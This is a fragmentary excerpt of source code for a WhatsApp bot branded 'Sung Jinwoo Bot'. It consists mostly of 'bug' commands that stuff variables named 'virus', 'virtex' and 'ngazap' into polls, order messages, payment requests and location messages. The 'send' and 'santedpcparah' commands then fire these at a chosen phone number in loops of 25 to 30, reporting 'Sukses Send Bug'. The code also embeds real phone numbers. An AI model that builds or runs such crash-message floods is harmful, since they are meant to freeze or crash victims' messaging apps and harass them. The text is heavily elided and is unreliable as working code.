...
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Sung Jinwoo Bot WhatsApp`, 
...
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6288804947282@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
...
"fileName": `Sung jinwoo Bot WhatsApp${ngazap(prefix)}`,
...
item3.URL:https://instagram.com/humanzzdev
...
"message": {
"pollCreationMessage": {
"name": `Sung Jinwoo Bot ${virus}${virtex(prefix)}`,
"options": [
	{
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `SungJinwoo Bot WhatsApp${ngazap(prefix)}`,
"orderTitle": "Sung Jinwoo Bot WhatsApp${ngazap(prefix)}",
"sellerJid": "6288804947282@s.whatsapp.net",
...
const botzkayla = "6288804947282@s.whatsapp.net"
...
Title : ${atdl.title}`, `Auto Downloader By Sung Jinwoo`, ftext)
}
}
...
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/GwwExAbB6u84v09dKqKZgO',
"sourceUrl": 'https://chat.whatsapp.com/GwwExAbB6u84v09dKqKZgO'
}
}
})
break
...
case 'join': {
if (!itsMeKayla) return reply(mess.owner)
if (!text) return reply(`Contoh ${prefix+command} linkgroup`)
...
for (let yoi of anu) {
kayla.sendMessage(yoi,{text:`Info² Maszeh
...
owned = '6288804947282@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
...
status: 1,
surface: 1,
message: 'Created By Sung Jinwoo',
...
case 'addprem':
if (!itsMeKayla) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6288804947282`)
...
"pollCreationMessage": {
"name": "HALO SAYA SUNG JINWOO BOT",
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
...
break
case 'send':{
if (!q) return reply(`Penggunaan ${prefix+command} 6288804947282`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = '30'
...
contextInfo:{
"externalAdReply": {
"title": `Sung Jinwoo Bot ${virus}${virtex(prefix)}`,
"body": `Sung Jinwoo Bot ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `Sung Jinwoo Bot WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
...
Message: { 
extendedTextMessage: { 
text: `Sung jinwoo Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
"caption": `sung JinwooBot ${virus}${virtex(prefix)}`,
...
"title": `Sung Jinwoo Bot WhatsApp ${virus} ${virtex(prefix)}`,
...
"name": `Sung jinwoo Bot ${virus}${virtex(prefix)}`,
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": `Sung Jinwoo Bot ${virus}${virtex(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `sung Jinwoo Bot ${virus}${virtex(prefix)}`, `Sung Jinwoo Bot ${virus}${virtex(prefix)}`, `Sung Jinwoo Bot ${virus}${virtex(prefix)}`, ppnyauser, "6288804947282@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
case 'santedpcparah': 
if (!itsMeKayla) return reply(mess.owner)
if (!q) return reply(`Contoh ${command} 6288804947282`)
...
Message: { 
extendedTextMessage: { 
text: `Sung JinwooBot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
"name": `Sung Jinwoo Bot WhatsApp ${virus}`,
"address": `Created By Sung Jinwoo ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
...
let e = String(err)
sendKaylaMessage("6288804947282@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
